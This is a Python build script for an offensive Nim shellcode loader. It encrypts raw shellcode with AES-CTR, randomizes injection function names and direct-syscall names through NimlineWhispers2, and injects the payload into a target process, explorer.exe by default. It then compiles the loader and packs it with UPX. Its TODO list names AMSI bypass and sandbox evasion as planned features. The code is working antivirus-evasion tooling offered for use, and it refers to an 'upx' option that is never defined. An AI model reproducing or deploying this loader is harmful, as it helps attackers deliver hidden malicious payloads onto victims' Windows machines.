#!/usr/bin/env python3

import os
import re
import hashlib
import subprocess
from pathlib import Path
from base64 import b64encode
from random import choices
from string import ascii_lowercase, ascii_uppercase, digits
from argparse import ArgumentParser
import shutil
import fileinput
import binascii
import random
import string

import Crypto.Util.Counter
from Crypto.Cipher import AES


# TO DO :
# Encrypt shellcode -- ok
# Replace in nim -- ok
# Decrypt shellcode -- ok
# Direct syscall + Encrypt strings -- ok
# Bypass AMSI
# Sandbox Evasion

structs = '''type
  PS_ATTR_UNION* {.pure, union.} = object
    Value*: ULONG
    ValuePtr*: PVOID
  PS_ATTRIBUTE* {.pure.} = object
    Attribute*: ULONG 
    Size*: SIZE_T
    u1*: PS_ATTR_UNION
    ReturnLength*: PSIZE_T
  PPS_ATTRIBUTE* = ptr PS_ATTRIBUTE
  PS_ATTRIBUTE_LIST* {.pure.} = object
    TotalLength*: SIZE_T
    Attributes*: array[2, PS_ATTRIBUTE]
  PPS_ATTRIBUTE_LIST* = ptr PS_ATTRIBUTE_LIST\n\n'''

class AESCTR:

    def __init__(self, password, iv):
        self.bs = AES.block_size
        self.key = hashlib.sha256(password.encode()).digest()
        self.iv = iv

    def encrypt(self, raw):
        ctr = Crypto.Util.Counter.new(128, initial_value=int.from_bytes(
            self.iv, byteorder='big'), little_endian=False)
        cipher = AES.new(self.key, AES.MODE_CTR, counter=ctr)
        return cipher.encrypt(raw)


def get_random_string(n):
    return ''.join(choices(ascii_lowercase + ascii_uppercase + digits, k=n))


def parse_args():
    parser = ArgumentParser()
    parser.add_argument('shellcode_bin', action='store',
                        type=str, help='path to the raw shellcode file')
    parser.add_argument('-p', '--process', action='store', type=str, default='C:\\Windows\\explorer.exe',
                        help='process to inject (default "C:\\Windows\\explorer.exe")')
    parser.add_argument('-o', '--output', action='store',
                        type=str, help='output filename')
    parser.add_argument('-r', '--rdmsyscalls', action='store_true', default=False,
                        help='use NimlineWhispers2 to randomize direct syscalls and generate syscalls.nim')
    parser.add_argument('--debug', action='store_true', default=False,
                        help='do not strip debug messages from Nim binary')
    
    return parser.parse_args()


if __name__ == '__main__':

    args = parse_args()

    with open(Path.cwd() / 'Basic_Injector.nim', 'r') as fd:
        template = fd.read()

    # Replace targeted process
    if args.process:
        print(args.process)
        print("[+] Targeted process :", args.process)
        template = template.replace(
            'TProcess: string = r""', f'TProcess: string = r"{args.process}"')

    if not args.debug:
        # Strip debug messages from Nim binary
        template = re.sub(r'.*DEBUG.*\n', '', template)
        template = re.sub(r'\s+# .*', '', template)

    # Replace random syscalls names
    if args.rdmsyscalls:
        print("\n [+] Using NimLineWhisper to randomize direct syscalls\n")
        os.system(
            "cd NimlineWhispers2 && python NimlineWhispers2.py --randomise --nobanner")
        shutil.copy("NimlineWhispers2\\syscalls.nim", ".")
        with open('syscalls.nim', 'r+') as fd:
            list_of_lines = fd.readlines()
            list_of_lines[182] = structs+"\n"
            sys_file = open("syscalls.nim", "w")
            sys_file.writelines(list_of_lines)
            sys_file.close()
            with open('syscalls.nim', 'r+') as fd:
                for line in fd.read().splitlines():
                    if line.startswith('# '):
                        api, api_rnd = line.lstrip('# ').split(' -> ')
                        template = template.replace(f'{api}(', f'{api_rnd}(')

    # Open shellcode
    with open(args.shellcode_bin, 'rb') as fd:
        shellcode = fd.read()

    # Encrypt shellcode in AES256+Base64
    password = get_random_string(16)
    iv = os.urandom(16)
    ctx = AESCTR(password, iv)
    enc = ctx.encrypt(shellcode)
    
    template = template.replace(
        'injectCreateRemoteThread', get_random_string(16))    
    template = template.replace(
        'password: string = ""', f'password: string = "{password}"')
    template = template.replace(
        'ivB64: string = ""', f'ivB64: string = "{b64encode(iv).decode()}"')
    template = template.replace(
        'encB64: string = ""', f'encB64: string = "{b64encode(enc).decode()}"')
    
    print("[+] Encrypting your shellcode ...")

    out = args.output if args.output else 'out'
    with open(f'{out}.nim', 'w') as fd:
        fd.write(template)

    print("[+] Compiling your Nim Loader (This my take some times ...)")
    os.system(f'nim c --hints:off {out}.nim')
    directory = os.getcwd()
    print("[+] File output : ", directory+"\\"+out+".exe")

    if args.upx:
        os.system(f'upx --best {out}.exe')

